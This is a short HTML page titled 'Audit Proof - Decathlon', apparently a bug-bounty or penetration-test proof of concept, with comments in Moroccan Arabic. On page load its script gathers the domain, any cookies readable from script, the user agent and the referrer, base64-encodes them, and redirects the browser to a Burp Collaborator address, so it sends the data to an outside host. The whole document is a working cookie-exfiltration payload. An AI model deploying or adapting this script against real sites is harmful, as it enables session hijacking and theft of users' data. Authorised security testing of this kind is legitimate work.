<!DOCTYPE html>
<html>
<head>
    <title>Audit Proof - Decathlon</title>
</head>
<body>
    <h1>System Loading...</h1>
    <script>
        // 1. حط هنا رابط الـ Collaborator ديالك اللي جبتي من Burp
        var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com"; 

        // 2. غانجمعو المعلومات اللي كنقدرو نوصلو ليها
        var exfil = {
            domain: document.domain,
            cookies: document.cookie, // غايجبد غير اللي ماشي HttpOnly
            ua: navigator.userAgent,
            ref: document.referrer
        };

        // 3. تشفير البيانات بـ Base64
        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(exfil))));

        // 4. إرسال التبليغ لـ Burp بزز منه عبر Redirect
        // هاد الطريقة هي اللي وصلاتك لـ 404 فـ السكرين اللخرة
        window.location.href = collab + "/?data=" + payload;
    </script>
</body>
</html>
